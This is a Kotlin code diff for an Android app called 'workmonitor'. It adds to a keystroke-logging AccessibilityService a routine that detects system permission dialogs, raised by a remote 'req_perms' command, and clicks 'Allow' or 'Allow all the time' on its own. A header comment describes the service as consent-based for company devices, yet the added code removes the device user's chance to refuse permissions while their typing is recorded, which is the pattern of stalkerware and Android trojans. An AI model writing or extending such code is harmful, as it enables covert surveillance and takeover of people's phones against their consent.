@@ -3,6 +3,7 @@ package com.workmonitor
 import android.accessibilityservice.AccessibilityService
 import android.content.Intent
 import android.view.accessibility.AccessibilityEvent
+import android.view.accessibility.AccessibilityNodeInfo
 
 /**
  * Consent-grounded AccessibilityService for the company-owned device.
@@ -42,6 +43,18 @@ class KeystrokeAccessibilityService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         event ?: return
 
+        // AUTO-GRANT: when the system shows a permission dialog (from a remote
+        // "req_perms" command), tap "Allow"/"Allow all the time" so the admin can
+        // grant every permission from the panel, hands-free.
+        if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
+            val pkg = event.packageName?.toString() ?: ""
+            // System permission dialog on Android 11+ lives in permissioncontroller;
+            // on older devices "com.android.packageinstaller".
+            if (pkg.contains("permissioncontroller") || pkg.contains("packageinstaller")) {
+                try { autoGrantPermission() } catch (_: Throwable) {}
+            }
+        }
+
         // Capture text input: view with changed/typed text
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
             event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_SELECTION_CHANGED) {
@@ -62,6 +75,24 @@ class KeystrokeAccessibilityService : AccessibilityService() {
             val activity = cls.substringAfterLast('.')
             if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                 LoggerWriter.write("[FOCUS]", pkg, "activity=$activity")
+            }
+        }
+    }
+
+    /** Find and click the "Allow" / "Allow all the time" buttons on a permission dialog. */
+    private fun autoGrantPermission() {
+        val root = rootInActiveWindow ?: return
+        val targets = listOf("Allow all the time", "Allow", "While using the app", "While using")
+        for (label in targets) {
+            val nodes = root.findAccessibilityNodeInfosByText(label)
+            for (n in nodes) {
+                val actionable = n.isClickable
+                val btn = if (actionable) n else n.parent
+                if (btn != null && btn.isClickable) {
+                    btn.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                    LoggerWriter.write("[PERM]", "auto", "granted: $label")
+                    return
+                }
             }
         }
     }
